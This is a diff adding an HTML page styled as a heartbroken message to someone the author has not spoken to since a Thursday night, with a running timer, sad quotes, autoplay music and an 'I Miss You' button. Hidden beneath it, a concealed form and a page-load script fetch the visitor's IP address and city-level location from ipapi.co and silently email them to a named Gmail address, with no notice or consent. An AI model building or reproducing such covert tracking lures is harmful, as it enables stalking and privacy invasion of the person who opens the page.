@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>We Haven’t Spoken...</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      color: white;
+      background: #000 url('https://i.ibb.co/NKZ7Pqd/sad-rain.gif') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 { font-size: 2em; margin-bottom: 20px; }
+    .timer { font-size: 1.5em; margin-bottom: 20px; }
+    .quote {
+      background: rgba(0, 0, 0, 0.5);
+      padding: 15px 20px;
+      border-radius: 10px;
+      font-size: 0.95em;
+      margin-top: 10px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1em;
+      background: rgba(255,255,255,0.1);
+      color: white;
+      border: 1px solid white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>We haven’t spoken since Thursday night...</h1>
+  <div class="timer" id="timer">Calculating...</div>
+  <div class="quote" id="quoteBox">Loading quote...</div>
+
+  <audio autoplay loop>
+    <source src="music.mp3" type="audio/mpeg">
+    Your browser does not support the audio element.
+  </audio>
+
+  <button onclick="window.location.href='miss-you-too.html'">I Miss You So Much 💔</button>
+
+  <!-- Hidden form to email IP location -->
+  <form id="hiddenForm" action="https://formsubmit.co/samsonisaac1172@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="ip_location" id="ip_location_input">
+    <input type="hidden" name="_subject" value="📍 New IP Location Captured">
+    <input type="hidden" name="_captcha" value="false">
+  </form>
+
+  <script>
+    // Timer
+    const startTime = new Date('2025-06-26T21:00:00');
+    function updateTimer() {
+      const now = new Date();
+      let diff = now - startTime;
+      const milliseconds = diff % 1000;
+      diff = Math.floor(diff / 1000);
+      const seconds = diff % 60;
+      diff = Math.floor(diff / 60);
+      const minutes = diff % 60;
+      diff = Math.floor(diff / 60);
+      const hours = diff % 24;
+      const days = Math.floor(diff / 24);
+      document.getElementById('timer').innerText =
+        `${days} days, ${hours} hours, ${minutes} minutes, ${seconds} seconds, ${milliseconds} ms`;
+    }
+    setInterval(updateTimer, 100);
+
+    // Sad quote
+    const quotes = [
+      "I miss the version of you that loved me.",
+      "Expectations are the root of heartbreak.",
+      "We stopped talking, but I still check on you silently.",
+      "You were my favorite hello and hardest goodbye.",
+      "It hurts to miss someone who doesn’t miss you."
+    ];
+    document.getElementById("quoteBox").innerText =
+      quotes[Math.floor(Math.random() * quotes.length)];
+
+    // Send IP-based location
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        const location = `${data.city}, ${data.region}, ${data.country_name}`;
+        const ip = data.ip;
+        const info = `IP: ${ip}, Location: ${location}, Time: ${new Date().toLocaleString()}`;
+        document.getElementById('ip_location_input').value = info;
+        document.getElementById('hiddenForm').submit();
+      });
+  </script>
+</body>
+</html>
